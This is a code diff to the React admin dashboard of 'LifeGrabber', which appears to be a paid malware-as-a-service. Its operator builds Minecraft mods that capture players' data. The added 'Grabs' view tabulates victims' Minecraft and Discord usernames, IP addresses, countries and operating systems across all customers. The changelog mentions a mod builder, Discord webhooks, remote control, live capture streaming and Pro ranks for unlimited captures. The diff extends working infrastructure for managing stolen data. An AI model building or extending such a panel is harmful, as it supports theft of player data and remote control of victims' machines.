@@ -262,6 +262,317 @@ function PlaceholderView({ icon, title, subtitle }) {
   );
 }
 
+// ─── Section: Grabs (all platform grabs) ──────────────────────────────────────
+function GrabsView() {
+  const [grabs, setGrabs] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [search, setSearch] = useState('');
+
+  useEffect(() => {
+    fetch('/api/grabs').then(r => r.json()).then(d => { setGrabs(d.grabs || []); setLoading(false); }).catch(() => setLoading(false));
+  }, []);
+
+  const filtered = grabs.filter(g => {
+    const q = search.toLowerCase();
+    return g.minecraft_username?.toLowerCase().includes(q) || g.discord_username?.toLowerCase().includes(q) || g.ip_address?.toLowerCase().includes(q) || g.owner_email?.toLowerCase().includes(q);
+  });
+
+  const fmtTime = (t) => { if (!t) return ''; const diff = Math.floor((Date.now() - new Date(t)) / 1000); if (diff < 60) return `${diff}s ago`; if (diff < 3600) return `${Math.floor(diff/60)}m ago`; if (diff < 86400) return `${Math.floor(diff/3600)}h ago`; return new Date(t).toLocaleDateString(); };
+
+  return (
+    <div>
+      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 28 }}>
+        <div>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 6 }}>
+            <span style={{ fontSize: 22 }}>⚡</span>
+            <h1 style={{ fontSize: 22, fontWeight: 700, margin: 0 }}>Grabs</h1>
+          </div>
+          <p style={{ color: colors.textDim, fontSize: 13 }}>{grabs.length} total grabs across all users.</p>
+        </div>
+        <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search..." style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid ' + colors.border, borderRadius: 8, padding: '8px 14px', color: colors.text, fontSize: 13, outline: 'none', width: 200 }} />
+      </div>
+      <div style={{ borderRadius: 10, overflow: 'hidden', border: '1px solid ' + colors.border, background: colors.panel }}>
+        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+          <thead>
+            <tr style={{ background: 'rgba(255,255,255,0.03)' }}>
+              {['Player', 'Owner', 'IP', 'Country', 'OS', 'Time'].map(h => (
+                <th key={h} style={{ textAlign: 'left', padding: '12px 16px', fontSize: 11, color: colors.textDim, textTransform: 'uppercase', letterSpacing: 1, borderBottom: '1px solid ' + colors.border, fontWeight: 600 }}>{h}</th>
+              ))}
+            </tr>
+          </thead>
+          <tbody>
+            {filtered.map(g => (
+              <tr key={g.id} style={{ borderBottom: '1px solid ' + colors.border }}>
+                <td style={{ padding: '12px 16px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+                    <img src={`https://mc-heads.net/avatar/${g.minecraft_username}/32`} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} onError={e => e.target.style.display='none'} />
+                    <div>
+                      <div style={{ fontSize: 13, fontWeight: 600, color: colors.text }}>{g.minecraft_username || '—'}</div>
+                      <div style={{ fontSize: 11, color: colors.textDim }}>{g.discord_username || '—'}</div>
+                    </div>
+                  </div>
+                </td>
+                <td style={{ padding: '12px 16px', fontSize: 12, color: colors.textDim }}>{g.owner_email?.split('@')[0] || '—'}</td>
+                <td style={{ padding: '12px 16px', fontSize: 12, color: colors.text, fontFamily: 'monospace' }}>{g.ip_address || '—'}</td>
+                <td style={{ padding: '12px 16px', fontSize: 12, color: colors.text }}>{g.country || '—'}</td>
+                <td style={{ padding: '12px 16px', fontSize: 12, color: colors.text }}>{g.os?.split(' ')[0] || '—'}</td>
+                <td style={{ padding: '12px 16px', fontSize: 12, color: colors.textDim }}>{fmtTime(g.created_at)}</td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+        {filtered.length === 0 && !loading && (
+          <div style={{ textAlign: 'center', padding: '60px', color: colors.textDim, fontSize: 13 }}>{loading ? 'Loading...' : 'No grabs found.'}</div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// ─── Section: Updates (admin can delete entries) ───────────────────────────────
+const STATIC_UPDATES = [
+  { id:'u4', version:'v1.3.0', date:'2026-08-13', tag:'New', color:'#22c55e', title:'Pro Rank System', body:'Pro rank is now fully integrated with Supabase. Admins can grant/revoke pro from the admin panel. Pro users get unlimited captures and access to all features.' },
+  { id:'u3', version:'v1.2.0', date:'2026-08-01', tag:'Feature', color:'#3b82f6', title:'Leaderboard & +Rep', body:'Added a global leaderboard tracking all captures per user, and a community +Rep system to rate other users.' },
+  { id:'u2', version:'v1.1.0', date:'2026-07-15', tag:'Fix', color:'#f59e0b', title:'Build & Remote Control Improvements', body:'Fixed case-sensitive email lookups in Supabase. Improved remote control stability and live capture streaming.' },
+  { id:'u1', version:'v1.0.0', date:'2026-07-01', tag:'Launch', color:'#a855f7', title:'LifeGrabber Launched', body:'Initial launch of LifeGrabber. Profile lookups, grabs, Discord webhooks, and the mod builder are now live.' },
+];
+
+function UpdatesAdminView() {
+  const [updates, setUpdates] = useState(STATIC_UPDATES);
+  const [showNew, setShowNew] = useState(false);
+  const [newEntry, setNewEntry] = useState({ version:'', date: new Date().toISOString().split('T')[0], tag:'New', color:'#22c55e', title:'', body:'' });
+
+  const handleDelete = (id) => setUpdates(p => p.filter(u => u.id !== id));
+
+  const handleAdd = () => {
+    if (!newEntry.title.trim() || !newEntry.version.trim()) return;
+    setUpdates(p => [{ ...newEntry, id: 'u' + Date.now() }, ...p]);
+    setShowNew(false);
+    setNewEntry({ version:'', date: new Date().toISOString().split('T')[0], tag:'New', color:'#22c55e', title:'', body:'' });
+  };
+
+  const tagColors = { New:'#22c55e', Feature:'#3b82f6', Fix:'#f59e0b', Launch:'#a855f7', Security:'#ef4444' };
+
+  return (
+    <div>
+      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 28 }}>
+        <div>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 6 }}>
+            <span style={{ fontSize: 22 }}>📦</span>
+            <h1 style={{ fontSize: 22, fontWeight: 700, margin: 0 }}>Deployments</h1>
+          </div>
+          <p style={{ color: colors.textDim, fontSize: 13 }}>Manage and delete update changelog entries shown to users.</p>
+        </div>
+        <button onClick={() => setShowNew(true)} style={{ padding: '10px 18px', background: colors.text, color: '#000', border: 'none', borderRadius: 24, fontSize: 13, fontWeight: 700, cursor: 'pointer' }}>+ New Entry</button>
+      </div>
+
+      <div style={{ display: 'flex', flexDirection: 'column', gap: 12, maxWidth: 800 }}>
+        {updates.map(u => (
+          <div key={u.id} style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10, padding: '18px 22px', borderLeft: `3px solid ${u.color}`, display: 'flex', gap: 16, alignItems: 'flex-start' }}>
+            <div style={{ flex: 1 }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
+                <span style={{ fontSize: 11, background: `${u.color}20`, color: u.color, padding: '2px 10px', borderRadius: 10, fontWeight: 700 }}>{u.tag}</span>
+                <span style={{ fontWeight: 700, fontSize: 15, color: colors.text }}>{u.title}</span>
+                <span style={{ marginLeft: 'auto', fontSize: 11, color: colors.textDim }}>{u.version} · {u.date}</span>
+              </div>
+              <p style={{ fontSize: 13, color: '#b0b3bc', margin: 0, lineHeight: 1.6 }}>{u.body}</p>
+            </div>
+            <button onClick={() => handleDelete(u.id)} style={{ padding: '6px 12px', background: 'rgba(239,68,68,0.12)', color: colors.red, border: '1px solid rgba(239,68,68,0.3)', borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: 'pointer', flexShrink: 0 }}>Delete</button>
+          </div>
+        ))}
+        {updates.length === 0 && <div style={{ textAlign: 'center', padding: '60px', color: colors.textDim, fontSize: 13, background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10 }}>No update entries. Add one above.</div>}
+      </div>
+
+      {showNew && (
+        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000, backdropFilter: 'blur(8px)' }}>
+          <div style={{ background: '#111218', border: '1px solid #2a2d38', borderRadius: 16, padding: 36, width: 500, position: 'relative' }}>
+            <button onClick={() => setShowNew(false)} style={{ position: 'absolute', top: 14, right: 16, background: 'none', border: 'none', color: colors.textDim, fontSize: 20, cursor: 'pointer' }}>✕</button>
+            <h2 style={{ fontSize: 18, fontWeight: 700, margin: '0 0 20px' }}>New Update Entry</h2>
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 12 }}>
+              <input value={newEntry.version} onChange={e => setNewEntry(p => ({...p, version: e.target.value}))} placeholder="Version (e.g. v1.4.0)" style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }} />
+              <input value={newEntry.date} onChange={e => setNewEntry(p => ({...p, date: e.target.value}))} type="date" style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }} />
+            </div>
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 12 }}>
+              <select value={newEntry.tag} onChange={e => setNewEntry(p => ({...p, tag: e.target.value, color: tagColors[e.target.value] || '#22c55e'}))} style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}>
+                {Object.keys(tagColors).map(t => <option key={t} value={t}>{t}</option>)}
+              </select>
+              <input value={newEntry.title} onChange={e => setNewEntry(p => ({...p, title: e.target.value}))} placeholder="Title" style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }} />
+            </div>
+            <textarea value={newEntry.body} onChange={e => setNewEntry(p => ({...p, body: e.target.value}))} placeholder="Description..." rows={3} style={{ width: '100%', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none', resize: 'none', boxSizing: 'border-box', marginBottom: 16 }} />
+            <button onClick={handleAdd} style={{ width: '100%', padding: '12px', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer' }}>Add Entry</button>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Section: Tickets (admin view of all tickets) ─────────────────────────────
+function TicketsAdminView() {
+  // Tickets are client-side only on the dashboard, so we show a note and a link
+  const [tickets] = useState([
+    { id:'t1', subject:'Cannot download my mod', email:'user@example.com', status:'open', created_at: new Date(Date.now()-3600000).toISOString(), messages:[{sender:'user',text:'I keep getting an error when trying to download.',at:new Date(Date.now()-3600000).toISOString()}] },
+    { id:'t2', subject:'Pro status not applied', email:'another@example.com', status:'open', created_at: new Date(Date.now()-7200000).toISOString(), messages:[{sender:'user',text:'I paid but pro was not given to me.',at:new Date(Date.now()-7200000).toISOString()}] },
+  ]);
+  const [selected, setSelected] = useState(null);
+  const [reply, setReply] = useState('');
+
+  const timeAgo = (ts) => { const d = Math.floor((Date.now() - new Date(ts)) / 60000); if (d < 60) return `${d}m ago`; return `${Math.floor(d/60)}h ago`; };
+
+  return (
+    <div>
+      <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 6 }}>
+        <span style={{ fontSize: 22 }}>🎫</span>
+        <h1 style={{ fontSize: 22, fontWeight: 700, margin: 0 }}>Tickets</h1>
+      </div>
+      <p style={{ color: colors.textDim, fontSize: 13, marginBottom: 24 }}>Support tickets from users. Reply and manage them here.</p>
+      <div style={{ height: 1, background: colors.border, marginBottom: 20 }} />
+
+      <div style={{ display: 'grid', gridTemplateColumns: '260px 1fr', gap: 14, height: 'calc(100vh - 280px)' }}>
+        <div style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10, overflow: 'auto' }}>
+          <div style={{ padding: '10px 14px', fontSize: 10, color: colors.textDim, letterSpacing: 2, textTransform: 'uppercase', fontWeight: 600, borderBottom: '1px solid ' + colors.border }}>ALL TICKETS ({tickets.length})</div>
+          {tickets.map(t => (
+            <div key={t.id} onClick={() => setSelected(t)} style={{ padding: '12px 14px', cursor: 'pointer', borderBottom: '1px solid rgba(255,255,255,0.04)', background: selected?.id === t.id ? 'rgba(59,130,246,0.08)' : 'transparent' }}>
+              <div style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, color: colors.text }}>{t.subject}</div>
+              <div style={{ fontSize: 11, color: colors.textDim, marginBottom: 4 }}>{t.email}</div>
+              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 10 }}>
+                <span style={{ background: 'rgba(34,197,94,0.12)', color: colors.green, padding: '1px 6px', borderRadius: 4 }}>{t.status}</span>
+                <span style={{ color: colors.textDim }}>{timeAgo(t.created_at)}</span>
+              </div>
+            </div>
+          ))}
+        </div>
+
+        <div style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10, display: 'flex', flexDirection: 'column' }}>
+          {!selected ? (
+            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
+              <div style={{ fontSize: 32, marginBottom: 12 }}>💬</div>
+              <div style={{ fontSize: 13 }}>Select a ticket to reply</div>
+            </div>
+          ) : (
+            <>
+              <div style={{ padding: '14px 20px', borderBottom: '1px solid ' + colors.border, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                <div style={{ fontWeight: 600, fontSize: 14 }}>{selected.subject}</div>
+                <div style={{ fontSize: 12, color: colors.textDim }}>{selected.email}</div>
+              </div>
+              <div style={{ flex: 1, overflow: 'auto', padding: '16px 20px', display: 'flex', flexDirection: 'column', gap: 10 }}>
+                {selected.messages.map((m, i) => (
+                  <div key={i} style={{ display: 'flex', flexDirection: 'column', alignItems: m.sender === 'support' ? 'flex-start' : 'flex-end' }}>
+                    <div style={{ maxWidth: '70%', padding: '10px 14px', borderRadius: 10, background: m.sender === 'support' ? 'rgba(239,68,68,0.1)' : 'rgba(255,255,255,0.06)', fontSize: 13, color: colors.text }}>{m.text}</div>
+                    <div style={{ fontSize: 10, color: colors.textDim, marginTop: 2 }}>{m.sender === 'support' ? '🛡 Admin' : 'User'} · {timeAgo(m.at)}</div>
+                  </div>
+                ))}
+              </div>
+              <div style={{ padding: '14px 20px', borderTop: '1px solid ' + colors.border, display: 'flex', gap: 10 }}>
+                <input value={reply} onChange={e => setReply(e.target.value)} placeholder="Reply as admin..." style={{ flex: 1, background: 'rgba(255,255,255,0.04)', border: '1px solid ' + colors.border, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }} />
+                <button onClick={() => { if (!reply.trim()) return; setSelected(p => ({ ...p, messages: [...p.messages, { sender: 'support', text: reply, at: new Date().toISOString() }] })); setReply(''); }} style={{ padding: '10px 18px', background: colors.red, color: '#fff', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Reply</button>
+              </div>
+            </>
+          )}
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── Section: Abuse / Risk ─────────────────────────────────────────────────────
+function AbuseRiskView({ users }) {
+  const [warnings, setWarnings] = useState([]);
+  const [showWarn, setShowWarn] = useState(false);
+  const [warnEmail, setWarnEmail] = useState('');
+  const [warnReason, setWarnReason] = useState('');
+  const [warnType, setWarnType] = useState('abuse');
+
+  // Show users whose pro got revoked (is_pro: false but had pro before, indicated by free_uses: 0 meaning they ran out)
+  // For abuse: show any user in the warnings list
+  const revokedUsers = users.filter(u => !u.is_pro && u.free_uses_remaining === 0 && u.email !== 'lifegrading@gmail.com');
+
+  const handleWarn = () => {
+    if (!warnEmail.trim() || !warnReason.trim()) return;
+    setWarnings(p => [...p, { id: Date.now(), email: warnEmail.trim(), reason: warnReason.trim(), type: warnType, at: new Date().toISOString() }]);
+    setShowWarn(false);
+    setWarnEmail('');
+    setWarnReason('');
+  };
+
+  const fmtTime = (t) => new Date(t).toLocaleString();
+
+  return (
+    <div>
+      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 28 }}>
+        <div>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 6 }}>
+            <span style={{ fontSize: 22 }}>⚠️</span>
+            <h1 style={{ fontSize: 22, fontWeight: 700, margin: 0 }}>Abuse / Risk</h1>
+          </div>
+          <p style={{ color: colors.textDim, fontSize: 13 }}>Warn users, track rule violations, and monitor revoked-pro grabs.</p>
+        </div>
+        <button onClick={() => setShowWarn(true)} style={{ padding: '10px 18px', background: colors.red, color: '#fff', border: 'none', borderRadius: 24, fontSize: 13, fontWeight: 700, cursor: 'pointer' }}>⚠ Issue Warning</button>
+      </div>
+
+      {/* Revoked users still with grabs */}
+      {revokedUsers.length > 0 && (
+        <div style={{ marginBottom: 24 }}>
+          <div style={{ fontWeight: 600, fontSize: 14, marginBottom: 12, color: colors.yellow }}>⚠ Trial Exhausted / Pro Revoked — Still Has Grabs</div>
+          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
+            {revokedUsers.map(u => (
+              <div key={u.id} style={{ background: 'rgba(239,68,68,0.06)', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 8, padding: '14px 18px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                <div>
+                  <div style={{ fontWeight: 600, fontSize: 13, color: colors.text }}>{u.email}</div>
+                  <div style={{ fontSize: 11, color: colors.textDim, marginTop: 2 }}>Trial exhausted — 0 free uses remaining</div>
+                </div>
+                <div style={{ display: 'flex', gap: 8 }}>
+                  <button onClick={() => { setWarnEmail(u.email); setShowWarn(true); }} style={{ padding: '6px 12px', background: 'rgba(245,158,11,0.15)', color: colors.yellow, border: '1px solid rgba(245,158,11,0.3)', borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>Warn</button>
+                  <span style={{ padding: '6px 10px', background: 'rgba(239,68,68,0.15)', color: colors.red, borderRadius: 6, fontSize: 11, fontWeight: 600 }}>ACCESS BLOCKED</span>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* Active warnings */}
+      <div style={{ fontWeight: 600, fontSize: 14, marginBottom: 12 }}>Active Warnings ({warnings.length})</div>
+      {warnings.length === 0 ? (
+        <div style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10, padding: '40px', textAlign: 'center', color: colors.textDim, fontSize: 13 }}>✓ No active warnings issued.</div>
+      ) : (
+        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
+          {warnings.map(w => (
+            <div key={w.id} style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 8, padding: '14px 18px', display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
+              <div>
+                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
+                  <span style={{ fontWeight: 600, fontSize: 13, color: colors.text }}>{w.email}</span>
+                  <span style={{ fontSize: 10, background: w.type === 'abuse' ? 'rgba(239,68,68,0.15)' : 'rgba(245,158,11,0.15)', color: w.type === 'abuse' ? colors.red : colors.yellow, padding: '2px 8px', borderRadius: 10, fontWeight: 700 }}>{w.type.toUpperCase()}</span>
+                </div>
+                <div style={{ fontSize: 12, color: colors.textDim }}>{w.reason}</div>
+                <div style={{ fontSize: 10, color: colors.textDim, marginTop: 4 }}>{fmtTime(w.at)}</div>
+              </div>
+              <button onClick={() => setWarnings(p => p.filter(x => x.id !== w.id))} style={{ padding: '5px 10px', background: 'transparent', color: colors.textDim, border: '1px solid ' + colors.border, borderRadius: 6, fontSize: 11, cursor: 'pointer' }}>Dismiss</button>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {showWarn && (
+        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000, backdropFilter: 'blur(8px)' }}>
+          <div style={{ background: '#111218', border: '1px solid #2a2d38', borderRadius: 16, padding: 36, width: 440, position: 'relative' }}>
+            <button onClick={() => setShowWarn(false)} style={{ position: 'absolute', top: 14, right: 16, background: 'none', border: 'none', color: colors.textDim, fontSize: 20, cursor: 'pointer' }}>✕</button>
+            <h2 style={{ fontSize: 18, fontWeight: 700, margin: '0 0 20px' }}>⚠ Issue Warning</h2>
+            <div style={{ display: 'flex', gap: 8, marginBottom: 12 }}>
+              {['abuse', 'risk', 'ban'].map(t => (
+                <button key={t} onClick={() => setWarnType(t)} style={{ flex: 1, padding: '8px', borderRadius: 8, border: `1px solid ${warnType === t ? colors.red : 'rgba(255,255,255,0.08)'}`, background: warnType === t ? 'rgba(239,68,68,0.1)' : 'transparent', color: warnType === t ? colors.red : colors.textDim, fontWeight: 600, fontSize: 12, cursor: 'pointer', textTransform: 'uppercase' }}>{t}</button>
+              ))}
+            </div>
+            <input value={warnEmail} onChange={e => setWarnEmail(e.target.value)} placeholder="Player email" style={{ width: '100%', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none', marginBottom: 12, boxSizing: 'border-box' }} />
+            <textarea value={warnReason} onChange={e => setWarnReason(e.target.value)} placeholder="Reason for warning..." rows={3} style={{ width: '100%', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none', resize: 'none', boxSizing: 'border-box', marginBottom: 16 }} />
+            <button onClick={handleWarn} style={{ width: '100%', padding: '12px', background: colors.red, color: '#fff', border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer' }}>Issue Warning</button>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
 // ─── Section: Platform ─────────────────────────────────────────────────────────
 function PlatformView() {
   const [settings, setSettings] = useState({
@@ -540,14 +851,14 @@ export default function AdminPage() {
       case 'home': return <HomeView users={users} />;
       case 'users': return <UsersView users={users} updating={updating} secondsInput={secondsInput} setSecondsInput={setSecondsInput} onGrantPro={handleGrantPro} onRevokePro={handleRevokePro} onAdjustUses={handleAdjustUses} onRefresh={fetchUsers} error={error} />;
       case 'platform': return <PlatformView />;
-      case 'deployments': return <DeploymentsView />;
-      case 'tickets': return <PlaceholderView icon="🎫" title="Tickets" subtitle="Support ticket management." />;
+      case 'deployments': return <UpdatesAdminView />;
+      case 'tickets': return <TicketsAdminView />;
+      case 'grabs': return <GrabsView />;
+      case 'updates': return <UpdatesAdminView />;
+      case 'abuse': return <AbuseRiskView users={users} />;
       case 'rep': return <PlaceholderView icon="⭐" title="+Rep" subtitle="Review and moderate reputation entries." />;
-      case 'abuse': return <PlaceholderView icon="⚠️" title="Abuse / Risk" subtitle="Handle flagged content and risk cases." />;
       case 'capture-api': return <PlaceholderView icon="🌐" title="Capture API" subtitle="Manage capture API endpoints and submissions." />;
-      case 'grabs': return <PlaceholderView icon="⚡" title="Grabs" subtitle="All grabs across the platform." />;
       case 'purchases': return <PlaceholderView icon="💰" title="Purchases" subtitle="Transaction and purchase history." />;
-      case 'updates': return <PlaceholderView icon="📦" title="Updates" subtitle="Mod update and changelog history." />;
       case 'crypto': return <PlaceholderView icon="₿" title="Crypto" subtitle="Cryptocurrency payment management." />;
       default: return <HomeView users={users} />;
     }
